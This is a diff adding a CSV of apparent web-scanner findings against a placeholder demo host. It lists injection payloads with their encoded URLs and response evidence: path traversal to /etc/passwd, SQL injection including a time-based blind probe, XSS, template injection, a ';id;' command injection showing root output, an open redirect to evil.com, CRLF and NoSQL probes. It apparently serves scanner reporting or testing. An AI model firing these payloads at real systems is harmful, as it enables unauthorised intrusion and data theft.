@@ -1,0 +1,11 @@
+severity,category,technique,injection_kind,injection_name,payload,encoding,url,status,resp_len,resp_time_ms,evidence
+critical,path_traversal,file-read,path,filename,../../../../etc/passwd,none,https://demo.example.local/download/../../../../etc/passwd,200,1560,210.3,file content marker: root:x:0:0:root:/root:/bin/bash
+high,sqli,sql-error,query,user,' OR '1'='1,none,https://demo.example.local/search?user=%27+OR+%271%27%3D%271,500,1420,184.5,You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
+high,sqli,time-based-blind,query,id,1' AND SLEEP(5)-- -,url,https://demo.example.local/item?id=1%27+AND+SLEEP%285%29--+-,200,310,5240.0,elapsed 5.2s vs baseline 0.2s
+high,xss,xss-reflection,query,q,<script>alert(1)</script>,none,https://demo.example.local/search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E,200,980,95.2,reflected in html context
+high,ssti,ssti-eval,query,name,{{7*7}},url,https://demo.example.local/hello?name=%7B%7B7%2A7%7D%7D,200,240,88.9,template evaluated our expression
+high,cmdi,cmd-output,body_form,host,;id;,none,https://demo.example.local/ping,200,640,310.4,command output: uid=0(root) gid=0(root) groups=0(root)
+medium,open_redirect,open-redirect,query,next,//evil.com,none,https://demo.example.local/login?next=//evil.com,302,0,45.1,redirected to: //evil.com
+medium,crlf,crlf-header,query,lang,%0d%0aX-Injected:%20true,none,https://demo.example.local/set?lang=%0d%0aX-Injected:%20true,200,130,55.6,header X-Injected present: true
+low,xss,xss-reflection,header,Referer,<svg onload=alert(1)>,html_entities,https://demo.example.local/account,200,2210,120.7,reflected in unknown context (encoded)
+info,nosql,reflection-info,body_json,user,"{""$ne"":null}",none,https://demo.example.local/api/login,200,512,74.2,payload reflected verbatim in response
